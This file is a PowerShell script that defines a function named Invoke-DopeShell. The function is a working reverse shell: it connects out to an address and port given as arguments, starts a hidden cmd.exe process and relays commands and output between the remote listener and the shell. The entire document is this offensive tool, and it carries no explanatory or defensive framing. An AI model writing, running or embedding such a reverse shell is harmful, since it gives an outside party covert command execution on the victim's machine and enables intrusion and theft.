function Invoke-DopeShell {
    param (
        [string]$address,
        [int]$port
    )

    function cleanup {
        if ($client.Connected -eq $true) {$client.Close()}
        if ($process -and $process.HasExited -eq $false) {$process.Close()}
        exit
    }

    $client = New-Object system.net.sockets.tcpclient
    $client.connect($address,$port)
    $stream = $client.GetStream()
    $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
    $process = New-Object System.Diagnostics.Process

    # Setup the process start info
    $process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true  # This will prevent the command prompt window from appearing

    $process.Start()
    $inputstream = $process.StandardInput
    $outputstream = $process.StandardOutput

    Start-Sleep 1
    $encoding = New-Object System.Text.AsciiEncoding
    $out = ""

    while ($outputstream.Peek() -ne -1) {
        $out += $encoding.GetString($outputstream.Read())
    }

    $stream.Write($encoding.GetBytes($out), 0, $out.Length)
    $out = $null
    $done = $false
    $testing = 0

    while (-not $done) {
        if ($client.Connected -ne $true) {cleanup}
        $pos = 0
        $i = 1

        while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
            $read = $stream.Read($networkbuffer, $pos, $networkbuffer.Length - $pos)
            $pos += $read
            if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}
        }

        if ($pos -gt 0) {
            $string = $encoding.GetString($networkbuffer, 0, $pos)
            $inputstream.Write($string)
            Start-Sleep 1

            if ($process.HasExited) {cleanup}
            else {
                $out = $encoding.GetString($outputstream.Read())
                while ($outputstream.Peek() -ne -1) {
                    $out += $encoding.GetString($outputstream.Read())
                    if ($out -eq $string) {$out = ''}
                }
                $stream.Write($encoding.GetBytes($out), 0, $out.Length)
                $out = $null
                $string = $null
            }
        } else {
            cleanup
        }
    }
}
